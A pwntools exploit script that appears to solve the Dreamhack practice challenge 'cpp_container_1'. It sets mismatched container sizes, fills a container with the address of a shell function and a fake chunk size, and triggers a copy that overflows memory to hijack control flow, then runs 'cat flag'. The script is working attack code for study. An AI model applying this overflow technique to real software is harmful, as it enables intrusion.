#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 22942
HOST = "host1.dreamhack.games"
exe = context.binary = ELF('./cpp_container_1', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b* 0x00000000004010E6
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def modify_container(size1, size2):
	p.sendlineafter(b'menu: ', str(2))
	p.sendlineafter(b'\n', str(size1))
	p.sendlineafter(b'\n', str(size2))

def copy_container():
	p.sendlineafter(b'menu: ', str(3))

def view_container():
	p.sendlineafter(b'menu: ', str(4))

# VARIABLE
get_shell = 0x401041

# PAYLOAD
modify_container(9, 1)

# make_container
p.sendlineafter(b'menu: ', str(1))
for i in range(3):
	p.sendlineafter(b'input: ', str(get_shell))
	p.sendlineafter(b'input: ', str(0))

p.sendlineafter(b'input: ', str(0x21))
p.sendlineafter(b'input: ', str(0))

p.sendlineafter(b'input: ', str(get_shell))
p.sendlineafter(b'input: ', str(0))

copy_container()
p.sendline(b'cat flag')

# GDB()

p.interactive()